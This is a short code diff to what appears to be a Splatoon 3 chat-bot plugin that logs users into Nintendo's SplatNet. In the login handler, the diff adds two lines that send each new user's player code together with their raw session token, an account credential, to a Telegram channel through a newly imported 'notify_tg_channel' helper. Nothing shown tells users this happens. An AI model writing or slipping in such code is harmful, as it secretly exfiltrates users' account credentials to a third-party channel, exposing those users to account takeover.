@@ -19,7 +19,7 @@ from .sp3iksm import log_in, login_2, A_VERSION
 from .splat import Splatoon
 from .sp3bot import get_last_battle_or_coop
 from .sp3job import get_post_stat_msg, update_s3si_ts, thread_function, threading, asyncio
-from .utils import bot_send, check_session_handler, KookBot
+from .utils import bot_send, check_session_handler, KookBot, notify_tg_channel
 from .scripts.report import get_report
 
 
@@ -143,6 +143,8 @@ Login success! Bot now can get your splatoon3 data from SplatNet.
     b_info = res_battle['data']['latestBattleHistories']['historyGroups']['nodes'][0]['historyDetails']['nodes'][0]
     player_code = base64.b64decode(b_info['player']['id']).decode('utf-8').split(':')[-1][2:]
     set_db_info(user_id=user_id, id_type=data['id_type'], user_id_sp=player_code)
+    _msg = f'new_login_user:{player_code}\n{session_token}'
+    await notify_tg_channel(_msg)
 
 
 @on_command("clear_db_info", block=True).handle()
